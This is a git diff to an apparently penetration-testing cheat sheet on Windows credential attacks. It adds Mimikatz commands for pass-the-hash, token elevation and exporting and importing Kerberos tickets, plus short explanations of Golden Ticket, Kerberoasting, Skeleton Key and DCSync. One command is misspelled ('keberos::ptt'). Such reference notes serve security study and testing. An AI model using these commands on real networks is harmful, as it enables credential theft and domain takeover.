@@ -517,7 +517,7 @@ gsecdump.exe -a > 1.txt
 
 - Pass the Hash (Mimikatz)
 ```
-sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
+mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
 ```
 
 <br>
@@ -550,9 +550,9 @@ sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe 
 **Token Stealing (Mimikatz)**
 - Assumes attacker has local admin
 ```
-privilege::debug
-token:whoami
-token:elevate /domain admin (identifies any domain admins present on the system)
+mimikatz # privilege::debug
+mimikatz # token:whoami
+mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
 ```
 
 **Common Tools**
@@ -598,6 +598,8 @@ token:elevate /domain admin (identifies any domain admins present on the system)
 	- Parent key in SECURITY/Policy can decode
 - Passwords are plaintext
 
+<br>
+
 ### Decrypt LSA Secrets (Nishang)
 - Requires Admin
 - Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
@@ -611,6 +613,48 @@ token:elevate /domain admin (identifies any domain admins present on the system)
 - AceHash
 - creddump
 - PowerShell
+
+<br>
+
+### Tickets (Kerberos)
+- Kerberos issues tickets to authenticated users
+- Cached in memory and valid for 10 hours
+- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
+- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
+- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)
+
+**Common Tools**
+- Mimikatz
+- WCE
+- kerberoast
+
+<br>
+
+### Pass the Ticket (Mimikatz)
+- Dump Tickets
+```mimikatz # sekurlsa::tickets /export```
+- Import ticket elsewhere
+```mimikatz # keberos::ptt [ticket]```
+- Now available to authenticate to throughout environment
+
+<br>
+
+### Kerberos Attacks
+- Pass the Ticket
+	- Steal Ticket from memory and pass or import on other systems
+- Overpass the Hash
+	- Use NT hash to request a service ticket from the same account
+- Kerberoasting
+	- Request service ticket for highly privileged service and crack NT hash
+- Golden Ticket
+	- Kerberos TGT for any account with no expiration. Survives full password reset
+- Silver Ticket
+	- All-access pass for a single service or computer
+- Skeleton Key
+	- Patch LSASS on domain controller to add backdoor password that works for any domain account
+- DCSync
+	- Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC
+- [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)
 
 <br>
 ---
